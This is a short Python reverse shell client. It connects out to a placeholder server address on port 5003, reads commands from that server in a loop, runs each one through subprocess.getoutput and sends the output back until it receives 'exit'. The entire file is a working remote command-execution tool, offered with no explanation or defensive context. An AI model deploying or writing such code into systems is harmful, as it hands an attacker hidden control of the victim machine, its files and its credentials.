#coding:utf-8
import socket
import subprocess

SERVER_HOST = "IP"
SERVER_PORT = 5003
BUFFER_SIZE = 1024

#create socket obj

s = socket.socket()

#connect to the server

s.connect((SERVER_HOST, SERVER_PORT))


message = s.recv(BUFFER_SIZE).decode()
print('Server:', message)

while True:
	#receive from

	command = s.recv(BUFFER_SIZE).decode()
	if command.lower() == 'exit':
		break
	output = subprocess.getoutput(command)
	#sendresults
	s.send(output.encode())

s.close
